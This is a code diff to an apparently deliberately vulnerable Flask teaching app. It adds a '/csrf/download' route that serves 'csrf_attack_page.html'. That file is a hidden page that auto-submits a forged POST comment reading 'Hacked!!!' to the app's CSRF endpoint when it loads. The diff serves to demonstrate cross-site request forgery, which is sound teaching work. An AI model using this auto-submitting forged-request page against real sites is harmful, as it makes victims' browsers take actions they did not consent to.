@@ -3,6 +3,7 @@ from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 from sqlalchemy.sql import text
 from loguru import logger
+from io import StringIO
 import subprocess
 import random
 import os
@@ -636,6 +637,31 @@ def csrf_delete_comment(id):
     db.session.delete(comment)
     db.session.commit()
     return redirect('/csrf')
+
+@app.route('/csrf/download', methods=['GET', 'POST'])
+def csrf_download():
+    output_string = '''
+    <!DOCTYPE html>
+    <html lang = "en">
+    <head>
+    <meta charset="UTF-8">
+    <title>CSRF Hack</title>
+    </head>
+    <body onload="document.myform.submit()" style="display:none">
+    <form action="''' + request.url[:-9] + ''' " name="myform" method="POST">
+        <input class="form-control" value="Hacked!!!" name="comment" id="comment">
+    </form>
+    </body>
+    </html>
+    '''
+    output_stream = StringIO(output_string)
+    response = Response(
+        output_stream.getvalue(), 
+        mimetype='text/html', 
+        content_type='application/octet-stream',
+    )
+    response.headers["Content-Disposition"] = "attachment; filename=csrf_attack_page.html"
+    return response 
     
 #############
 # DEBUGGING #
